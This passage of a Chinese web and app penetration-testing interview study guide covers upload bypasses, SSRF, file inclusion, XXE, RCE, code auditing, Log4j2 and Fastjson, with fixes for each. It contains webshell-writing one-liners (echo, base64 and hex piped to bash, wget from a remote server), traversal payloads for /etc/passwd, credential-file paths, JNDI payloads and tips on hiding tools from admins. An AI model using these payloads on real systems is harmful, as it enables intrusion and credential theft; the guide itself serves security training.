可能是对方PHP设置了disable_functions功能，导致其禁用了相关危险函数，如eval.exec.system等。可以通过黑名单进行绕过，对方可能设置不全忽略了某些危险函数

## 三.文件上传漏洞

### 1.文件上传漏洞如何绕过？（重点）

前端客户端js验证.服务器端验证.同解析后缀名绕过.后缀大小写绕过.Htaccess文件绕过.windows文件流绕过，竞争上传绕过.双写绕过.%00 00截断绕过.图片马二次渲染绕过.配合文件包含漏洞.配合服务器解析漏洞绕过.配合操作系统文件命令规则.CMS.编辑器漏洞.配合其他规则.WAF绕过

### 2.文件上传流程？

先检测在上传.先上传在检测

### 3.文件上传防护方式？（重点）

过滤.封端口.关服务

（1）对服务器后端上传的文件进行过滤

（2）及时更新补丁包

（3）对文件上传的目录进行控制，设置为不可执行 

（4）对上传文件后缀内容进行判断。

（5）使用随机数改写文件名和文件路径，避免shell连接

（6）单独设置文件服务器的域名

### 4.目前已知哪些版本的中间件有解析漏洞，具体举例（重点）

（1）IIS6.0

文件夹目录解析 /xx.asp/xx.jpg "xx.asp"是文件夹名，这样只要在 xx.asp 目录下面的任意文件都会当脚本解析。

xx.asp;.jpg  通过上传功能传到网站目录，直接会当作 asp 脚本执行。

（2）IIS 7.0.IIS7.5

默认 Fast-CGI 开启，直接在 url 中图片地址后面输入/1.php，会把正常图片当成 php 解析

（3）Nginx

版本小于等于 0.8.37，利用方法和 IIS 7.0/7.5 一样，Fast-CGI 关闭情况下也可利用。

空字节代码 xxx.jpg.php

（4）Apache

上传的文件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀

### 5.拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？

能做的事情很多，用隐藏网马来举例子： 插入 SetHandler application/x-httpd-php.jpg 文件会被解析成.php 文件。

### 6.在某后台新闻编辑界面看到编辑器，应该先做什么？

查看编辑器的名称版本,然后搜索公开的漏洞。

### 7.审查上传点的元素有什么意义？

有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。

### 9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403.什么原因？（重点）

原因很多，有可能 web 服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过

### 10.在 win2003 服务器中建立一个名为.a的隐藏文件夹用意何为？

隐藏文件夹，为了不让管理员发现你传上去的工具。

### 11.常用中间件.数据库.第三方应用.操作系统默认配置文件是什么？

```bash
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysql 配置文件
/etc/httpd/conf/httpd.conf //apache 配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql 历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的 cmdline 参数
```



## 四.SSRF漏洞原理及漏洞实战 

### 1.怎么找SSRF漏洞，SSRF可以做什么

SSRF称为服务端请求伪造攻击，通常是目标系统对外发起请求的情况，才会造成该攻击生效，一般是通过某些对外发起请求的参数，攻击者通过SSRF可以对目标系统进行内网打点，使用file伪协议可以读取系统内的文件，使用dict伪协议可以查看内网存活主机，使用gopher伪协议反弹shell，配合redis写shell操作

### 2.可能引发SSRF漏洞的函数有哪些简单介绍一下？

file_get_contents() 获取本地或者远程文件内容

fsockopen() 获得套接字信息

curl_exec() 随意攻击内网中所有应用

fopen() 打开文件或者 URL

readfile() 输出一个文件

### 3.ssrf业务场景有哪些？（重点）

分享:通过URL地址分享网页内容

转码服务（手机适配)

在线翻译(百度翻译搜索检索IP的网址:http://www.ip.cn )

图片加载与下载:通过URL地址加载或下载图片

图片.文章收藏功能

未公开的api实现以及其他调用URL的功能

从URL关键字中寻找(share.wap.url.link.src.source.target.sourceURI.imageURL.domain )

图片加载与下载

### 4.ssrf 怎么用 redis 写 shell（重点）

答：

（1）SSRF 服务端请求伪造

a. 对内网扫描，获取 banner

b. 攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如Struts2，sqli 等）

c. 利用协议读取本地文件

d. 云计算环境 AWS Google Cloud 环境可以调用内网操作 ECS 的 API 

(2)如 webligic SSRF 漏洞

通过 SSRF 的 gopher 协议操作内网的 redis，利用 redis 将反弹 shell 写入 crontab 定时任务，url 编码，将\r 字符串替换成%0d%0a

### 5.SSRF漏洞如何进行防护？（重点）

通过正则表达式编写不允许访问本机和内网

用户指定("或者预埋在前端的请求")的地址进行资源请求,则请做好目标地址的过滤

限制协议只为HTTP.HTTPS， 减少其他如file://.gopher://和ftp://等可能引起的问题 协议

禁止3xx跳转, 重定向

设置URL白名单或者限制内网IP



## 五.暴力破解及验证码安全

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image006.jpg)

1.要发现验证码的问题，你会从那些角度去找，实际工作过程中发现过那些验证码的问题

客户端.服务端.弱验证码等三个角度去绕过，还有一些特殊的，如验证码，在 Cookies 里面.固定验证码.在网页返回数据包里面等。



## 六.文件包含漏洞

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image008.jpg)

### 1.PHP文件包含漏洞的函数了解吗，利用文件包含有哪些限制条件（重点）

```
PHP包含函数主要有include().require().include_once().require_once()
利用时需要注意PHP是否开启allow_url_include（本地文件包含开关）和allow_url_forpen（远程文件包含开关）功能
```

### 2.任意文件包含绕过思路有哪些？

（1）url编码代替.或者/，如使用%2F代替/，如
 ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd .+./../etc/passwd

（2）加入+，如
 ?filename=.+./.+./bin/redacted.dll

（3）在点中间添加%00，如
 ?filename=.%00./file.php
 /etc/passwd%00.jpg

### 3.哪些上传点容易出现任意文件包含漏洞？

文件读取或者展示图片等对文件读取交互的功能块 

### 4.任意文件包含读取时，哪些是我们应该关注的重点？

（1）进行目录跳转时，关注重点：各种历史命令如： 出现的密码.路径.配置文件路径.其他关联IP.日志文件.war包.备份文件路径等等，可进一步读取或利用。 

（2）windows桌面路径

（3）利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。 

（4）读取网站的相关配置信息，数据库配置等如：redis：/etc/redis.conf

/etc/httpd/conf/httpd.conf

（5）读取应用日志文件。 获取网站后台地址.api接口.备份.等等敏感信息 apache：/var/log/apache2/access.log nginx：/var/log/nginx/access.log

### 5.任意文件包含漏洞如何防范？

可以通过（1）对../以及相关编码进行过滤（2）敏感词防护。（3）程序报错内容不要有回显（4）对web服务器目录权限进行最小权限设置（5）对用户输入点进行严格验证（6）注意如PHPinfo()的web敏感信息泄露造成的任意文件读取

### 6.struts2 框架漏洞原理

答：

(1)struts 是 java 的 web 框架

(2)采取 OGNL 表达式，处理 view 层数据字符串到 controller 层转换成 java 对象

(3)重点关注的编号加粗如下

S2-057 影响范围非常小

S2-048 影响范围非常小

S2-046 和 S2-045 一样

S2-045 影响范围较大—-通过 Content-Type 这个 header 头，进而执行命令，通过 Strus2 对错误消息处理进行回显

S2-037 影响范围小

S2-032 影响范围小

S2-020 影响范围小

S2-019 影响范围一般

S2-016 影响范围非常大

S2-013 S2-016 范围内

S2-009 S2-016 范围内

S2-005 S2-016 范围内

### 7.本地包含与远程包含的区别？

本地包含只需找个上传点，把图片木马上传到对方服务器，通过本地包含漏洞直接包含木马脚本木马就可以运行 webshell,远程包含需要服务器 php 关闭魔术符号与开启远程包含功能才行。

### 8.文件读取和包含函数都有哪些？（重点）

```bash
filegetcontents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parseinifile(),show_source(),file()等
```

##  七.CSRF漏洞

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image010.jpg)

### 1.CSRF.SSRF 和重放攻击有什么区别？

(1)CSRF 是跨站请求伪造攻击，由客户端发起

(2)SSRF 是服务器端请求伪造，由服务器发起

(3)重放攻击是将截获的数据包进行重放，达到身份认证等目的

### 2.csrf修复方式？（重点）

(1)提交验证码。在表单中添加一个随机的数字或字母验证码。通过强制用户和应用进行交互。来有效地遏制CSRF攻击。

(2)Referer Check。检查假设是非正常页面过来的请求，则极有可能是CSRF攻击。

(3)token验证。token需要足够随机，敏感的操作应该使用POST。而不是GET，以form表单的形式提交。能够避免token泄露。



## 八.XXE漏洞

### 1.CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？（重点）

(1)XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。

修复方式：对字符实体进行转义.使用 HTTP Only 来禁止 JavaScript 读取Cookie 值.输入时校验.浏览器与 Web 应用端采用相同的字符编码。

(2) CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。

修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token.再次输入密码.检验Referer

(3)XXE 是 XML 外部实体注入攻击，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。

修复方式：XML 解析库在调用时严格禁止对外部实体的解析。

2.xxe 注入有哪些危害以及防御 ？

(1)引用外部实体`<!ENTITY 实体名称 SYSTEM "URI">`或者 `<!ENTITY 实体名称 PUBLIC "public_ID" "URI">`当允许引用外部实体时，通过构造恶意内容

(2)可导致读取任意文件.执行系统命令.探测内网端口.攻击内网网站等危害。对于不同XML解析器,对外部实体有不同处理规则,在PHP中默认处理的函数为:xml_parse 和 simplexml_load xml_parse 的实现方式为 expat 库，默认情况不会解析外部实体,而 simplexml_load 默认情况下会解析外部实体,造成安全威胁.

(3)防御：

方案一.使用开发语言提供的禁用外部实体的方法

libxml_disable_entity_loader(true);

方案二.过滤用户提交的 XML 数据

1.检查所使用的底层 xml 解析库，默认禁止外部实体的解析

2.使用第三方应用代码及时升级补丁

3.同时增强对系统的监控，防止此问题被人利用

对于 PHP,由于 simplexml_load_string 函数的 XML 解析问题出在 libxml 库上,所以加载实体前可以调用这样一个函数

### 4.你常用的渗透工具有哪些，最常用的是哪个？

burpsuit,appscan,avwvs,sqlmap,fiddler 等

### 5.给你一个网站你是如何来渗透测试的?（重点）

在获取书面授权的前提下：

(1)信息收集，

a.  获取域名的 whois 信息,获取注册者邮箱姓名电话等。

b.  查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。

c.  查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞

d.  查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync心脏出血，mysql,ftp,ssh 弱口令等。

e.  扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针

f.  google hack 进一步探测网站的信息，后台，敏感文件

(2)漏洞扫描

开始检测漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等

(3)漏洞利用

利用以上的方式拿到 webshell，或者其他权限

(4)权限提升

提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows

低版本的漏洞，如 iis6,pr,巴西烤肉， linux 脏牛漏洞，linux 内核版本漏洞提权，

linux 下的 mysql system 提权以及 oracle 低权限提权

(5)日志清理

(6)总结报告及修复方案

### 6.如何拿一个网站的 webshell？（重点）

上传，后台编辑模板，sql 注入写文件，命令执行，代码执行，一些已经爆出的 cms 漏洞，比如 dedecms 后台可以直接建立脚本文件，wordpress 上传插件包含脚本文件 zip 压缩包等

8.常见owasp漏洞有哪些？（重点）

(1)SQL 注入防护方法：

(2)失效的身份认证和会话管理

(3)跨站脚本攻击 XSS

(4)直接引用不安全的对象

(5)安全配置错误

(6)敏感信息泄露

(7)缺少功能级的访问控制

(8)跨站请求伪造 CSRF

(9)使用含有已知漏洞的组件

(10)未验证的重定向和转发

## 九.RCE漏洞

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image012.jpg)

### 1.rce漏洞知道它的原理吗？

答：应用系统具有给用户提供指定的远程命令操作的接口，导致攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

### 2.可以利用的系统命令执行函数有哪些？（重点）

答：system()

passthru()

exec()

shell_exec()

popen()

proc_open()

pcntl_exec()

### 2.ThinkPHP rce漏洞了解吗？（重点）

答：自己之前做过thinkPHP的rce漏洞，5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞

### 3.遇到rce漏洞如何修复？

答：需要对相关敏感函数禁用，如可以进行命令执行的危险函数，对文件相关操作函数进行禁用，如fputs避免其写入shell拿到系统权限。同时对相关的变量进行过滤，使用WAF产品进行防护等

### 4.用Rce写入shell的方式知道吗？（重点）

答：（1）echo直接写入，如：echo '<?php eval($_POST[1]); ?>' > 1.php（2）base64写入，对写入poc进行编码，避免对方检测特殊字符函数等拦截导致写入失败，如：echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >2.php

（3）绕过重定向符，如

```bash
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | bash
```

（4）可出网且有wget的情况下，可以通过远端下载webshell，自己远端服务器放置webshell,开启http服务。在目标机器执行

```bash
wget http://xx.xx.xxx.xx:8000/xxx.php
```

（5）hex写入，在 https://www.107000.com/T-Hex/，将webshell编码成hex，然后命令注入执行，如：

```bash
echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps > 5.php
```



### 5.Windows系统管道符中，&执行顺序是什么？

答：`“&” commandA & commandB` 先运行命令A，然后运行命令B

### 6.命令执行的函数都有哪些？

```bash
system(), exec(), shellexec(), passthru() ,pcntlexec(), popen(),proc_open()
eval,pregreplace+/e,assert,calluserfunc,calluserfuncarray,create_function等等
```

 



## 十.APP渗透面试

### 1.app如何抓包

答：可以直接通过bp导入证书抓包，或者通过模拟器进行辅助抓包

### 2.如何防御app抓包

答：可以使用网络客户端无代理模式，证书校验

### 3.安卓app抓包无法抓取https数据怎么办？

答：通过给手机安装burp证书，抓取https流量



### 4.APP渗透测试流程？（重点）



APP测试流程与web测试流程类似，分为如下七个阶段：

1.根据需求说明书编写测试计划；

2.制定测试方案，主要是测试任务.测试人员和测试时间的分配；

3.测试准备，包括搭建测试环境，准备测试数据，确定测试方法；

4.测试用例的设计与编写，进行用例评审及补充完善；

5.执行测试时首先进行冒烟测试，然后对主功能流程进行测试，包括客户端的单个功能模块，及功能业务逻辑功能交互，回归测试；

6.提交测试结果，包括测试用例，测试计划；

7.日常维护性测试；

### 5.APP漏洞了解吗（重点）



答：支付宝应用克隆漏洞，漏洞主要利用了Android系统WebView控件的同源策略漏洞来进行攻击，Android应用内部分可导出的Activity组件中，WebView允许通过file url对http域进行访问，并且并未对file域的路径进行严格校验所导致



修复: 避免App内部的WebView被不信任的第三方调用



### 6. 现在Android平台上的几种加固方式 ？（重点）



1.混淆： 用没有意义的字符，如a.b.c或者易于混淆的字符，如0.o.O.l.I.1代替原本的有意义的类名 



2.膨胀： 编写一些垃圾代码来扩充代码量， 如乘法改加法.加法改自加，在不影响功能实现前提，增大代码数量



3.加壳 DEX壳：在APP运行起来后，动态加载程序代码 如：由java代码动态加载后变.dex文件



4.动态加载APK



### 7.APP渗透威胁来源？



客户端.服务端.数据传输

### 8.给你APP进行渗透测试，哪些功能点可能存在漏洞，渗透思路？（重点）

客户端测试

1.关键数据明文传输

应用程序在登录过程中，使用http协议明文传输用户名和密码，并未对用户名和密码进行加密处理。通过监控网络数据就可以截获到用户名和用户密码数据，导致用户信息泄露，给用户带来安全风险。

2.任意账号注册

使用手机号133*887注册某个APP，获取验证码46908；在确认提交时，拦截请求，修改注册的手机号码，即可注册任意账号，这里修改为1338*678（任意手机号）；分别使用133*887和133*678（任意手机号）登录，均可以通过验证登录，看到最终结果。

3.登录界面可被钓鱼劫持

应用存在钓鱼劫持风险。应用程序没有做防钓鱼劫持措施，通过劫持应用程序的登录界面，可以获取用户的账号和密码，可能导致用户账号信息的泄露。

接口调用测试，

1.Activity交互组件

a.越权绕过：Activity用户界面绕过会造成用户信息窃取.Activity界面被劫持产生欺诈等安全事件
 b.钓鱼欺诈/Activity劫持：组件导出导致钓鱼欺诈
 c.隐私启动intent包含敏感数据
 d.拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验
 Activity的组件导出，一般会导致的问题：Android Browser Intent Schema URLs的攻击手段。

2.Service

漏洞种类：权限提升，service劫持，消息伪造，拒绝服务。
 危害：如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能，这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。

3.Content Provider

漏洞种类：信息泄露，SQL注入，目录遍历
 危害：Content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞。

4.Broadcast Receiver

漏洞种类：敏感信息泄露，权限绕过，消息伪造，拒绝服务
 危害：发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露，接收广播时处理不当，便会导致拒绝服务攻击.伪造信息.越权操作等。

 

### 9.如果进行Android钓鱼，大概操作流程？（重点）

答：以小米手机为例：

1.当打开3个APP时，最后一个打开的APP”语音助手”，切换至手机桌面，长按HOME键查看进程，”语音助手”会显示在进程的第一个。

2.点击”微信”以后，切换至”微信”，再查看进程，可以看到，进程中由于”微信”已切换至当前窗口，故进程中不存在。

3.可以从第1步看到，当切换至手机桌面时，无论是语音助手.手机令牌.还是微信，都是默认后台运行，而且切换出来以后无任何提示。这样，当恶意activity收到微信登录界面或者其他敏感界面的时候，就会抢先推送至客户，从而让客户轻易的输入了帐号，并获取了客户的信息，但此时微信不会做任何提示。

4.再来观看一下某行手机APP，当切换至手机桌面时，会对客户做出提示。如下图：

假设一下页面是恶意推送的activity，那么在恶意推送的APP页面，应该会显示出此类提示，告知客户，此页面并非正常APP的页面。

用户打开正常页面 vs 用户打开了恶意页面

### 10.介绍一个APP抓包工具？

 答：一般用Fiddler，主要用来做app抓包使用，先在Fiddler客户端做好各项配置，端口设置为8888;然后在手机上设置代理，就可以抓包，主要看的是服务器返回的值.还能够修改传入参数.传出的参数.模拟网络延时，构造不同场景。

### 11.如果APP数据包 GET 或者 POST 传参中有token等鉴权参数，例如

GET /api/GetUserInfo?id=xxx&token=xxxx HTTP/1.1可以进行哪些操作？

答：可以尝试将token参数的值置空或者删除token参数，往往能 bypass 鉴权

### 12.APP测试和Web测试的区别？（重点）

答：单纯从功能测试的层面上来讲的话，APP 测试.web 测试在流程和功能测试上是没有区别的。
 相同点：1.同样的测试用例设计方法；2.同样的测试方法：都会依据原型图或效果图检查UI；3.测试页面载入和翻页的速度.登录时长.内存是否溢出等；4.测试应用系统的稳定性；不同点：
 1.系统结构方面

web项目，b/s架构，基于浏览器的；web测试只要更新了服务器端，客户端就会同步更新。

app项目，c/s结构的，必须要有客户端；app 修改了服务端，则客户端用户所有核心版本都需要进行回归测试一遍。

2.性能方面

web项目 需监测 响应时间.CPU.Memory；

app项目 除了监测 响应时间.CPU.Memory外，还需监测 流量.电量等；

3.兼容性方面

web项目：浏览器（火狐.谷歌.IE等）；操作系统（Windows7.Windows10.Linux等）。

app项目：设备系统:iOS（ipad.iphone）.Android（三星.华为.联想等） .Windows（Win7.Win8）.OSX（Mac）；手机设备可根据 手机型号.分辨率.屏幕尺寸不同。

### 13.介绍一下Android四大组件？

 Android四大基本组件：Activity.BroadcastReceiver广播接收器.ContentProvider内容提供者.Service服务。

Activity：应用程序中，一个Activity就相当于手机屏幕，它是一种可以包含用户界面的组件，主要用于和用户进行交互。一个应用程序可以包含许多活动，比如事件的点击，一般都会触发一个新的Activity。

BroadcastReceiver广播接收器：应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯.震动.播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。

ContentProvider内容提供者：内容提供者主要用于在不同应用程序之间实现数据共享的功能，它提供了一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访问数据的安全性。只有需要在多个应用程序间共享数据时才需要内容提供者。例如：通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处：统一数据访问方式。

Service服务：是Android中实现程序后台运行的解决方案，它非常适合去执行那些不需要和用户交互而且还要长期运行的任务（一边打电话，后台挂着QQ）。服务的运行不依赖于任何用户界面，即使程序被切换到后台，或者用户打开了另一个应用程序，服务仍然能够保持正常运行，不过服务并不是运行在一个独立的进程当中，而是依赖于创建服务时所在的应用程序进程。当某个应用程序进程被杀掉后，所有依赖于该进程的服务也会停止运行（正在听音乐，然后把音乐程序退出）。

 

### 14. 你所了解的APP测试工具？

APP弱网测试&抓包工具：

QNET

Fiddler

Charles

### 15.APP安全加固措施有哪些？

1.服务器安全

大部分APP使用服务器作为后端，在APP安全加固的同时，也要做好服务器的安全包括Windows.Linux的安全加固，对服务器的端口进行安全设置，实行端口安全策略，对服务器做全面的渗透测试等。

2.网站安全

网站安全也叫web安全，很多APP都嵌入网站来使用一些接口调用，在方便快捷的同事，也要对网站进行安全加固，包括网站的漏洞检测，日至安全分析，定期安全巡检等安全工作。

3.代码混淆加密

APP在开发时一定要对代码进行混淆加密，对APP的代码进行安全审计，对数据的传输做混合多层次的加密与解密，对APP权限做严格的安全判断与限制。

4.安全验证

对APP登录做安全认证，增强APP接口的安全，增加身份安全验证，敏感接口做数据传输的双向加密措施。

5.组件安全

如果APP的组件不需要导出，或者组件配置了intent filter标签，可将组件的“android:exported”属性设置为false；如果组件需要给外部应用使用，应对组件进行权限控制。

### 16.移动APP有哪些典型安全漏洞？

答：1.图形验证码逻辑后门



## 十一.代码审计面试题

### 1.看您简历上说会php代码审计，也没有类似的经历能够分享一下，比如说独自审的一套代码或者开源项目，从中发现的一些漏洞

答：当然，我自己审计过cms，bluecms是审计的第一个CMS，从安装模块找到双引号解析漏洞，尝试对CMS进行重装时，发现在设置数据库，管理员用户信息位置，会将相关数据插入到配置文件，并到存储到数据库。我尝试对数据库名称位置进行闭合木马写入，失败后分析源码发现其使用双引号，尝试双引号解析漏洞成功写入shell。还发现存储型XSS等

### 2.在审项目的时候，比如一个web网站，简单说说思路

答：web漏洞大部分都是由功能和传参产生，拿到网站我会先从功能入手，看网站有哪些功能，像用户注册处，可能会有SQL注入，逻辑错误可以尝试爆破用户名密码，如果用户可以上传头像，我会尝试是否能进行图片马上传，之后在源码处搜索文件包含的特殊函数等尝试对木马进行包含getshell，还有xss漏洞等，用户登录，用户修改资料，包括后台导航管理，网站相关信息配置，模块管理，系统设置等，这些位置都有可能存在漏洞。任何传参都是有危险的，可以采用灰盒的方式，在前台抓取数据包，看数据被传送到那个文件，在找到上下文处进行分析等

### 3.代码审计的几种思路？

答：（1）全文通读（2）敏感函数定位（3）采用灰盒方式通过抓取数据包，查看数据传送到哪个页面，到指定页面查找传参位置，在分析上下文进行回溯等

### 4.如何定位潜在漏洞点？

答：可以搜索漏洞相关危险函数，像PHP文件包含危险函数有include()，include_once()，require()，require_once()等。存在这些函数说明存在文件包含，可以通过上下文分析，传参来源定位跟踪，全文搜索等进行定位。

### 5.php原生的敏感函数有哪些，比如搜关键字的话会搜哪些

答：敏感函数像文件包含有：

include/require/include_once/require_once

代码执行：

eval/assert/preg_replace（执行一个正则表达式的搜索和替换）/create function（通过执行代码字符串创建动态函数）

// shell_exec通过 shell 执行命令并将完整的输出以字符串的方式返回system/passthru/exec/shell_exec/popen/proc_open

文件操作：

file_get_contents/fread/readfile/file/highlight_file/show_source

file_put contents/fwrite/mkdir/fputs

unlink（删除文件）/rmdir（删除目录）

move_uploaded_file/copy/rename

curl_exec（执行 cURL 会话）/fopen

extract（从数组中将变量导入到当前的符号表）/parse_str（将字符串解析成多个变量）

XXE:

simplexml_load_file/simplexml_load_string/SimpleXMLElement/DOMDocument/xml_parse（解析 XML 文档）

var_dump/print_r/exit/die 

反序列化：

serialize(),unserialize(),__wakeup()魔术方法等

编码转换：

urldecode/iconv/mb_convert_encoding（转换字符串，从一个字符编码到另一个字符编码）/stripslashes（ 反引用一个引用字符串）/base64_decode/substr

搜索关键字，就可以搜索以上这些

### 6.学代码审计偏哪个语言？擅长哪个语言

答：偏向PHP，自己也做过相关CMS审计。(可以具体举例你的审计过程，这个看第一题答案）

### 7.了解过自动化代码审计的工具吗？

答：了解过，主要使用seay进行审计，我认为它主要是可以同时打开多个文件进行分析，自动审计等功能，还用了解过Fortify也是审计的工具

### 9.简单描述一下什么是水平越权，什么是垂直越权，我要发现这两类漏洞，那我代码审计要注意什么地方

答：水平越权攻击者可以访问操控与其拥有同级权限的用户资源，垂直越权指权限不等的两个用户之间的越权访问。出现这种漏洞主要是由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误。审计时可以着重关注判断用户登录状态相关校验，是否只再在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面等，判断是否存在越权漏洞 

### 10.拿到一份php代码做审计，审计的流程大概是怎样的

答：

（1）信息搜集，如果是CMS网站等，可以找设计文档或者帮助手册

（2）静态代码分析，通过阅读源代码.查看应用程序的文件和目录结构以及检查相关配置文件了解应用程序的结构和逻辑

（3）用户输入和验证，审查代码中的用户输入处理和验证机制，包括表单提交.URL参数.Cookie等。检查是否存在不正确的输入验证或过滤，以及潜在的安全漏洞，如跨站脚本（XSS）.SQL注入等。

（4）访问控制：审查代码中的访问控制机制，包括权限验证.会话管理和页面访问限制等。验证是否存在未经授权的访问.访问控制缺陷或敏感数据泄露等安全问题。

（5）文件操作：检查代码中的文件上传.文件读取和文件包含功能。查找是否存在文件上传漏洞.路径遍历漏洞等安全问题。

（6）数据库安全：审查代码中的数据库查询和数据处理机制，包括SQL语句构造.数据转义和数据库访问控制等。验证是否存在SQL注入.未经授权的数据库访问或敏感数据泄露等问题。

（7）密码安全：审查代码中的密码存储.密码传输和密码重置等功能。查找是否存在明文存储.弱密码加密或未安全传输等密码安全问题。

（8）安全日志：检查代码中的日志记录机制，包括错误日志.访问日志和安全事件日志等。确保适当的日志记录和监测机制存在，以便进行后续的审计和调查。

（9）第三方库和组件：审查代码中使用的第三方库和组件，查找是否存在已知的漏洞或安全问题。确保使用的库和组件是最新版本，并及时应用安全补丁。

（10）漏洞验证：一旦发现潜在的漏洞，尝试利用它们来验证其可利用性和影响。确保在授权的环境中进行漏洞验证，并遵守道德和法律的规定。

（11）编写漏洞报告 

# 4.国内打点常见漏洞面试题

## 1.了解过log4j2的漏洞吗，原理是什么？

### 1-1.Apache Log4j2介绍

Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

### 1-2.Log4j2漏洞原理（重点）

Apache log4j2-RCE漏洞是由于Log4j2提供的lookup功能下的jndi模块出现问题所导致的，该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源并执行其中的代码，从而造成远程代码执行漏洞。

### 1-3.log4j2漏洞检测（重点）

（1）dnslog手动验证方法

首先在dnslog平台获取一个子域名，尝试构造payload，插入请求数据包。

```
${jndi:ldap://xxx.dnslog.com}
```

通过dnslog平台是否收到请求，初步判断目标环境是否存在漏洞。

（2）Log4j-scan脚本验证

一款用于查找log4j2漏洞的python脚本，支持url检测，支持HTTP请求头和POST数据参数进行模糊测试。

github项目地址：

https://github.com/fullhunt/log4j-scan

（3）Log4j2 burp被动扫描插件

通过插件的方式，将lLog4j2漏洞检测能力集成到burp，从而提升安全测试人员的漏洞发现能力。

github项目地址：

https://github.com/f0ng/log4j2burpscanner

（4）AWVS等漏洞扫描工具扫描log4j2漏洞

AWVS等漏洞扫描工具支持Log4j2漏洞检测，支持批量扫描。

### 1-4.漏洞利用

攻击者构造下面payload提交给服务器，服务器访问并执行rmi服务器恶意exoloit，从而获取目标服务器的权限。

```
${jndi:rmi://rmi服务器地址/exploit}
```

攻击过程示意图：

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image002-1733806107703-10.jpg)

### 1-5.修复建议（重点）

（1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；

（2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；

（3）JDK使用11.0.1.8u191.7u201.6u211及以上的高版本；

（4）限制受影响应用对外访问互联网；

（5）禁用JNDI。如在spring.properties里添加spring.jndi.ignore=true；

（6）部署使用第三方防火墙产品进行安全防护，并更新WAF.RASP规则等。

## 2.了解过fastjson漏洞吗，原理是什么？（重点）

### 2-1.Fastjson介绍

Fastjson是阿里巴巴开发的一款高性能的Java JSON库。在某些版本的Fastjson中，存在反序列化漏洞。攻击者可以通过构造恶意的JSON数据，执行任意代码或获取敏感信息。

### 2-2.Fastjson漏洞原理

Fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了AutoType功能，Fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。

### 2-3.fastjson漏洞检测

（1）判断是否存在fastjson

如果有原始报错回显，尝试发送一个单独的 { 来触发报错，如果报错中明确包含fastjson则代表存在fastjson。

（2）判断是jackson还是fastjson

